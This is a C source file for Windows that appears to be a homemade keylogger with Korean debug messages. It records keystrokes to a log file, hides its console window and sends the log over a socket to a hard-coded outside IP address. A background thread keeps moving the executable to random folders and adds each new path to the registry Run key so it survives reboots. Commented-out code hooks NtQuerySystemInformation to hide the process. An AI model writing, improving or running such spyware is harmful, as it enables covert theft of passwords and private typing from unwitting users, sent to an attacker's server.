#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <WinSock2.h>
#include <winternl.h>
#include <time.h>
#include <psapi.h>
#include <processthreadsapi.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ntdll.lib")



#define STATUS_SUCCESS              ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define BUFSIZE 1024

FILE* logFile;
HKEY hkey;
WSADATA wsaData;
SOCKET clinetSocket;
SOCKADDR_IN serverAddr;
FILE* fp;
DWORD TargetPID;
ULONGLONG SysPoint;
DWORD NewNtQuerySystemInformation_sizes;
PVOID NewFunc;


BOOL Get_exe_nameW(wchar_t* name, wchar_t* buffer) {
    int length = wcslen(name);
    int c = 0;

    for (int i = length - 1; i >= 0; i--) {
        if (name[i] == L'\\') {
            break;
        }
        buffer[c++] = name[i];
    }
    buffer[c] = L'\0';

    for (int i = 0; i < c / 2; i++) {
        wchar_t temp = buffer[i];
        buffer[i] = buffer[c - i - 1];
        buffer[c - i - 1] = temp;
    }

    return TRUE;
}

DWORD Get_PID(wchar_t* Name) {
    DWORD process_array[1024];
    DWORD cnt;
    HANDLE process;
    wchar_t image[1024];

    printf("%d", 100);
    EnumProcesses(process_array, sizeof(process_array) * 1024, &cnt);

    cnt = cnt / sizeof(DWORD);
    for (int i = 0; i < cnt; i++) {
        process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_array[i]);
        GetModuleBaseName(process, NULL, image, 1024);
        if (!wcscmp(image, Name)) {
            CloseHandle(process);
            return process_array[i];
        }
        CloseHandle(process);
    }

}


void WriteToLog(char* text)
{
    logFile = fopen("key_log.txt", "a");
    fprintf(logFile, "%c", text);
    fclose(logFile);
}

BOOL KeyInList(int iKey)
{
    switch (iKey)
    {
    case VK_SPACE:
        WriteToLog(" ");
        break;
    case VK_RETURN:
        WriteToLog("\n");
            break;
    case VK_SHIFT:
        WriteToLog("*SHIFT*");
        break;
    case VK_BACK:
        WriteToLog("*BACKSPACE*");
        break;
        //case VK_RBUTTON:
        //    WriteToLog("*RCLICK*");
        //    break;
        //case VK_LBUTTON:
        //    WriteToLog("*LCLICK*");
        //    break;

    case VK_CONTROL:
        WriteToLog("*CTRL*");
        break;

    case VK_MENU:
        WriteToLog("*ALT*");
        break;

    case VK_LWIN:
        WriteToLog("*L_Window*");
        break;

    case VK_RWIN:
        WriteToLog("*R_Window*");
        break;

    case VK_OEM_COMMA:
        WriteToLog(",");
        break;

    case VK_CAPITAL:
        WriteToLog("CapLock");
        break;

    case VK_OEM_PERIOD:
        WriteToLog(".");
        break;





    case VK_OEM_1:
        WriteToLog(";");
        break;

    case VK_OEM_7:
        WriteToLog("'");
        break;

    case VK_OEM_4:
        WriteToLog("[");
        break;

    case VK_OEM_6:
        WriteToLog("]");
        break;

    case VK_OEM_MINUS:
        WriteToLog("-");
        break;

    case VK_OEM_PLUS:
        WriteToLog("=");
        break;

    case VK_OEM_3:
        WriteToLog("'");
        break;

    case VK_OEM_5:
        WriteToLog("\n");
            break;

    case VK_F1:
        WriteToLog("F1");
        break;

    case VK_TAB:
        WriteToLog("Tab");
        break;

    case VK_F2:
        WriteToLog("F2");
        break;

    case VK_F3:
        WriteToLog("F3");
        break;

    case VK_F4:
        WriteToLog("F4");
        break;

    case VK_F5:
        WriteToLog("F5");
        break;

    case VK_F6:
        WriteToLog("F6");
        break;

    case VK_F7:
        WriteToLog("F7");
        break;
    case VK_F8:
        WriteToLog("F8");
        break;

    case VK_F9:
        WriteToLog("F9");
        break;

    case VK_F10:
        WriteToLog("F10");
        break;

    case VK_F11:
        WriteToLog("F11");
        break;

    case VK_F12:
        WriteToLog("F12");
        break;



    case VK_END:
        WriteToLog("End");
        break;

    case VK_DELETE:
        WriteToLog("Del");
        break;

    case VK_INSERT:
        WriteToLog("Insert");
        break;

    case VK_HOME:
        WriteToLog("Home");
        break;



    default: return FALSE;
    }
    return TRUE;
}

BOOL Reg_set(char* path) {
    LONG createStatus = RegCreateKeyA(HKEY_CURRENT_USER, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", &hkey);

    LONG setRes = RegSetValueExA(hkey, "testtesttesttest", 0, REG_SZ, (BYTE*)path, strlen(path) * sizeof(char)); //path to your program
    RegCloseKey(hkey);
    return TRUE;
}


int random_folder(char* path) {
    srand(time(NULL));
    WIN32_FIND_DATAA findFileData;
    HANDLE hFind;
    char wpath[1000];
    int dir_count = 0;
    int i;
    sprintf(wpath, "%s*", path);


    hFind = FindFirstFileA(wpath, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("FindFirstFile failed %d 3", GetLastError());
            return 0;
    }
    do {
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            //printf("%s", findFileData.cFileName);
                if (strcmp(findFileData.cFileName, ".") == 0 || strcmp(findFileData.cFileName, "..") == 0) {
                    continue;
                }
            dir_count++;
        }
    } while (FindNextFileA(hFind, &findFileData) != 0);

    FindClose(hFind);

    if (dir_count == 0) {
        return 2;
    }

    int random_folder = (rand() % dir_count);
    dir_count = 0;

    hFind = FindFirstFileA(wpath, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("FindFirstFile failed %d", GetLastError());
        return 0;
    }
    do {
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(findFileData.cFileName, ".") == 0 || strcmp(findFileData.cFileName, "..") == 0) {
                continue;
            }
            if (random_folder == dir_count) {
                //strcat_s(path, 1000, "\");
                strcat_s(path, 1000, findFileData.cFileName);
                break;
            }
            dir_count++;
        }
    } while (FindNextFileA(hFind, &findFileData) != 0);

    FindClose(hFind);


    return 1;
}


DWORD WINAPI main_tread() {
    char buffer[1000];
    char path[2000];
    char path_o[2000];
    //char argv[2000];

    //sprintf_s(argv, "%s", arg);

    int i, j;
    GetModuleFileNameA(NULL, path_o, sizeof(path_o));

    while (TRUE) {
        srand(time(NULL));
        Sleep(2000);
        sprintf(path, "%s", "C:\\");

        i = rand() % 1000;
        j = 0;
        //random_folder(path);

        for (int j = 0; j < i; j++) {
            j = random_folder(path);
            if (j == 2 || j == 0) {
                break;
            }
            strcat(path, "\\");
        }
        sprintf(buffer, "%x", rand() % 10000);
        strcat(buffer, ".exe");


        strcat(path, buffer);

        if (MoveFileA(path_o, path) == 0) {
            GetModuleFileNameA(NULL, path, sizeof(path));
            Reg_set(path);
            MoveFileA(path_o, path);
        }
        else {
            Reg_set(path);
        }
        //printf("%s", path_o);
        sprintf(path_o, "%s", path);

    }



    return 0;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode < 0)
        return CallNextHookEx(0, nCode, wParam, lParam);
    KBDLLHOOKSTRUCT* key = (KBDLLHOOKSTRUCT*)lParam;

    BOOL keyDown = wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN;

    char keyName[32];

    GetKeyNameTextA(MapVirtualKeyA(key->vkCode, 0) * 65536, keyName, 32);


    if (keyDown == TRUE)
        printf("%s", keyName);


    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

DWORD WINAPI send_log(LPVOID lpParam) {
    int readCnt;
    char buf[1024];
    int totalSentBytes, sentBytes = 0;
    while (1) {
        Sleep(5000);
        fopen_s(&fp, "Key_log.txt", "rb");
        if (fp == NULL) {

            break;
        }
        while (1) {
            readCnt = fread((void*)buf, 1, 100, fp);
            if (feof(fp))
                break;

            sentBytes = send(clinetSocket, buf, 100, 0);

            if (sentBytes == -1) {
                printf("Error while sending log: %d", WSAGetLastError());
                    break;
            }

        }
        printf("로그 전송! %d\n", readCnt);
            fclose(fp);
    }

    printf("연결 끊김");
        return 0;
}


//NTSTATUS NTAPI NewNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PSYSTEM_PROCESS_INFORMATION SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
//    
//    NTSTATUS ntstatus = ((NTSTATUS(*)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength))SysPoint)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
//    wchar_t exe[1024];
//    DWORD PID;
//    if (ntstatus != STATUS_SUCCESS)
//    {
//        return ntstatus;
//    }
//
//    if (SystemInformationClass == 5)
//    {
//        printf("진입!\n");
//        PSYSTEM_PROCESS_INFORMATION pCur = SystemInformation;
//        PSYSTEM_PROCESS_INFORMATION pPrev = pCur;
//        pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONGLONG)pCur + pCur->NextEntryOffset);
//
//        GetModuleFileNameW(NULL, exe, 1024);
//        PID = Get_PID(exe);
//        while (TRUE)
//        {
//            if ((DWORD)pCur->UniqueProcessId == PID) {
//                printf("PID 비교 성공!\n");
//
//                if (pCur->NextEntryOffset == 0)
//                    pPrev->NextEntryOffset = 0;
//                else {
//                    pPrev->NextEntryOffset += pCur->NextEntryOffset;
//                }
//            }
//            else
//                pPrev = pCur;
//
//            if (pCur->NextEntryOffset == 0)
//                break;
//
//            pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONGLONG)pCur + pCur->NextEntryOffset);
//        }
//    }
//
//    return ntstatus;
//}

DWORD Func_size(PVOID func) {
    ULONGLONG Pointer = 0xCCCCCCCCCCCCCCC3;
    for (int i = 0; ; i++) {
        if (memcmp((PVOID)((ULONGLONG)func + i), &Pointer, 8) == 0) {
            return i;
        }
    }
}
//
//BOOL NtQuerySystemInformation_Hook() {
//
//    ULONGLONG NtQuerySystemInformation;
//    HANDLE hProcess;
//    wchar_t exe[1024];
//    wchar_t image_name[1024];
//    BYTE NewNtQuerySystemInformation_size[5];
//    LONGLONG pfunc = (LONGLONG)NewNtQuerySystemInformation;
//    DWORD Protect;
//    SIZE_T Wrtie_Byte;
//    BYTE Syscall[16] = { 0x4C, 0x8B, 0xD1, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
//    BYTE TrampolineCode[12] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 };
//
//
//    GetModuleFileNameW(NULL, exe, 1024);
//    Get_exe_nameW(exe, image_name);
//    wprintf_s(L"%s\n", image_name);
//    printf("\nPID: %d\n", Get_PID(image_name));
//
//    memcpy(NewNtQuerySystemInformation_size, (ULONGLONG)NewNtQuerySystemInformation, 5);
//    for (int i = 4; i > 0; i--) {
//        printf("%x\n", NewNtQuerySystemInformation_size[i]);
//        pfunc += (NewNtQuerySystemInformation_size[i] << (i * 8 - 8));
//    }
//
//    pfunc += 5;
//    printf("%llx\n", pfunc);
//    printf("%llx", Func_size((PVOID)pfunc));
//
//    NtQuerySystemInformation = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
//
//    NewNtQuerySystemInformation_sizes = Func_size((PVOID)pfunc) + 1;
//
//    printf("pid: %d", Get_PID(image_name));
//    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Get_PID(image_name));
//    NewFunc = VirtualAllocEx(hProcess, NULL, NewNtQuerySystemInformation_sizes, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
//
//    SysPoint = (ULONGLONG)pfunc + NewNtQuerySystemInformation_sizes;
//    memcpy(Syscall + 4, (NtQuerySystemInformation + 4), 4);
//    
//    for (int i = 0; i < 8; i++) {
//        TrampolineCode[i+2] = (pfunc >> ((i * 8)) & 0xFF);
//        printf("code: %x\n", (pfunc >> (i *8) & 0xFF));
//    }
//    
//
//    VirtualProtectEx(hProcess, NtQuerySystemInformation, 12, PAGE_EXECUTE_READWRITE, &Protect);
//    
//    VirtualProtectEx(hProcess, SysPoint, 16, PAGE_EXECUTE_READWRITE, &Protect);
//    
//    //WriteProcessMemory(hProcess, NewFunc, (PVOID)pfunc, NewNtQuerySystemInformation_sizes, &Wrtie_Byte);
//    WriteProcessMemory(hProcess, NtQuerySystemInformation, TrampolineCode, 12, &Wrtie_Byte);
//    
//    WriteProcessMemory(hProcess, SysPoint, Syscall, 16, &Wrtie_Byte);
//
//    CloseHandle(hProcess);
//    return TRUE;
//}



int main(int argc, char* argv[]) {
    CreateThread(NULL, 0, send_log, NULL, 0, NULL);
    CreateThread(NULL, 0, main_tread, NULL, 0, NULL);

    //NtQuerySystemInformation_Hook();
    char key;
    HWND Console;
    char buf[1024];
    int readCnt;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return -1;

    clinetSocket = socket(PF_INET, SOCK_STREAM, 0);

    if (clinetSocket == INVALID_SOCKET)
        return -1;

    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    //inet_pton(AF_INET, serverIp, &(servAddr.sin_addr.s_addr));
    serverAddr.sin_addr.s_addr = inet_addr("59.6.179.17");
    serverAddr.sin_port = htons(12345);

    if (connect(clinetSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        
        return -1;
    }


    while (TRUE)
    {
        Console = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(Console, 0);
        for (key = 8; key <= 190; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                if (KeyInList(key) == FALSE)
                {
                    logFile = fopen("key_log.txt", "a");
                    fprintf(logFile, "%c", key);
                    fclose(logFile);

                }
            }
        }
    }


    shutdown(clinetSocket, SD_SEND);
    closesocket(clinetSocket);
    WSACleanup();

    
    return 0;

}